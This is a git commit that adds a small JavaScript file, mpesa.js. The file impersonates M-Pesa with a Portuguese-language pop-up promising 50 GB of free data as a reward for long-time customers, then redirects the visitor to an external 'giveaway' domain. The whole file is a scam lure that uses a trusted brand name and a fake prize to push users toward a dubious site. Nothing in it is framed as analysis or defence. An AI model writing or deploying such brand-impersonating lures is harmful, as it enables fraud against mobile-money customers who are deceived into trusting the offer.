bde25286775e6bc9af34608e85e505cd8922481c
bigetijazz4 <bigetijazz4@gmail.com>
2024-10-16 21:53:17 -0700

    Create mpesa.js

---
+++ mpesa.js
@@ -0,0 +1,6 @@
+
+var password = 'REIVINDICAR 50GB '
+password=prompt('M-PESA: Olá, reivindique os seus 50 GB de dados gratuitos de recompensas de clientes antigos da M-pesa. Prima OK para reivindicar agora ','REIVINDICAR 50GB');
+if (password != 'REIVINDICAR 50GB') {
+location.href='https://www.moreofferzdetails.xyz/50gbgiveaway';
+}
